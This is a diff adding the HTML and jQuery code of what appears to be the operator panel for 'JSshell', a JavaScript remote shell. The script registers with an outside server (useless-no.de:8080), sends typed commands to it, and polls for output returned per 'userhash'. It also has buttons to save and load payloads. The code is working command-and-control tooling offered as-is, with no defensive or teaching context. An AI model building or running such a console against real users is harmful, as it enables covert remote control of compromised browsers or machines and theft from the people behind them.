@@ -1,0 +1,84 @@
+<html>
+<head>
+<title>JSshell admin interface FINAL</title>
+<script src="jquery.js"></script>
+<script src="jquery-linenos.js"></script>
+<link rel="stylesheet" type="text/css" href="admin.css">
+<link rel="stylesheet" type="text/css" href="lines.css">
+</head>
+<body>
+	<script>
+	var lastRet;
+	var testCount = 0;
+	var id
+	function sendCmd (cmdOb){
+		$.ajax({
+			url:"http://useless-no.de:8080/cmd",
+			type:"post",
+			data:"data=" + encodeURIComponent(cmdOb)
+		});
+	}
+	function getRet (){
+		var posttosite = function(data){
+			var ret = JSON.parse(data.responseText);
+			if(ret.retID != lastRet){
+				lastRet = ret.retID;
+				var entry = ret.userhash + ": " + ret.data + "\n";
+				var prev = $("#rBox"). val();
+				$("#rBox").val(prev + entry);
+				
+			}
+			getRet()
+		};
+		$.ajax({
+			url:"http://useless-no.de:8080/ret",
+			type:"get",
+			data:{'id':id},
+			async:"true",
+			timeout:"50000",
+			complete: posttosite,
+			error:getRet
+		});
+	}
+	$(document).ready(function(){
+		$("#send").click(function(){
+			var cmdOb = new Object;
+			cmdOb.userhash = "";
+			cmdOb.cmd = $("#cmd").val();
+			cmdData = JSON.stringify(cmdOb);
+			sendCmd(cmdData);
+		});
+		$("#cmd").linedtextarea();
+		$("#rBox").attr("disabled", "disabled");
+		var register = function(data){
+			var obj = JSON.parse(data.responseText);
+			id = obj.id;
+			getRet();
+		}
+		$.ajax({
+			url:"http://useless-no.de:8080/new",
+			type:"get",
+			complete:register
+		});
+	});
+	
+	</script>
+	<div id="header">
+		<img src="logo.png">
+	</div>
+	<br>
+<div id="sendCommand">
+	<textarea id="cmd" rows="15" cols="75"></textarea>
+	<input type="submit" id="send" value="Send">
+	<input type="text" id="SnippetName">
+	<input type="submit" id="savebtn" value="Save Payload">
+	<select>
+		<option value="dummy">dummy</option>
+		<option value="none">none</option>
+		<option value="dirk">drik</option>
+	</select>
+	<input type="submit" id="loadBtn" value="Load Payload">
+</div>
+<div id="returnBox">
+<textarea id="rBox" rows="15" cols="75"></textarea>
+</div>
